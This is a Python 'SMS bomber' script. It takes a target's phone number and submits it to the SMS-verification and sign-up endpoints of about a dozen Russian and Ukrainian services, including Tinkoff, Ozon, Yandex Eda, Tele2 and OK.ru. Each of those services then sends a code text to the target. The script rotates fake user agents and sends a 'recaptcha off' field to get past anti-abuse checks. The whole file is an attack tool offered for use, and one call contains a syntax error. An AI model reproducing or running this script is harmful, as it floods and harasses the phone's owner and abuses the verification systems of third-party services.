import requests, fake_useragent
from colorama import Fore, Back, Style


ua = fake_useragent.UserAgent().random
heder = {'user_agent' : ua}

print(Fore.RED + 'XXXXXXXXXXXXXXXXXXXX,\n MXLDARKNESS SMSBOMBER \n XXXXXXXXXXXXXXXXXXXX') 

x = input("ВВЕДИТЕ НОМЕР БЕЗ +:")

try: 
	r = requests.post('https://shop.vsk.ru/ajax/auth/postSms', data={'phone': x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")
try:
	r = requests.post('https://b.utair.ru/api/v1/login/', data ={'phone': x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")  
try:
	r = requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")
try:
	r = requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode", params={"pageName": "registerPrivateUserPhoneVerificatio"},  data={"phone": x, "recaptcha": "off", "g-recaptcha-response": "",}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")
try:
	r = requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")  
try:
	r = requests.post("https://msk.tele2.ru/api/validation/number/" + x, json={"sender": "Tele2"}, headers=heder)	
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")  
try:																																																																														
	r = requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" + x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")  
try:
	r = requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(")   
try:
	r = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(") 
try:
	r = requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" + x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(") 
try:
	r = requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", json={"phone": x, "otpId": 0} headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(") 
try:
	r = requests.post("https://account.my.games/signup_send_sms/", data={"phone": x}, headers=heder)
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(") 
try:
	r = requests.post("https://auth.multiplex.ua/login", json={"login": x})
	print("Отправка прошла успешно :D")
except:
	print("Неудача :(") 